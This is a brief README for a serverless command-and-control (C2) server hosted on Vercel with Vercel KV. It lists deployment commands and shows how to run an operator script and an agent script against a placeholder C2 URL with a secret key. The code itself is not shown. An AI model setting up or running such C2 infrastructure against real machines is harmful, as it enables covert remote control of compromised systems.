# C2 Server — Vercel

Serverless C2 built on Vercel + Vercel KV (Redis).

## Deploy

```bash
vercel deploy --prod
vercel env add C2_SECRET    # your secret key
vercel env add KV_REST_API_URL
vercel env add KV_REST_API_TOKEN
```

## Usage

**Operator:**
```bash
python3 lib/operator.py --url https://your-c2.vercel.app --key SECRET
```

**Agent:**
```bash
python3 lib/agent.py --url https://your-c2.vercel.app --key SECRET
```
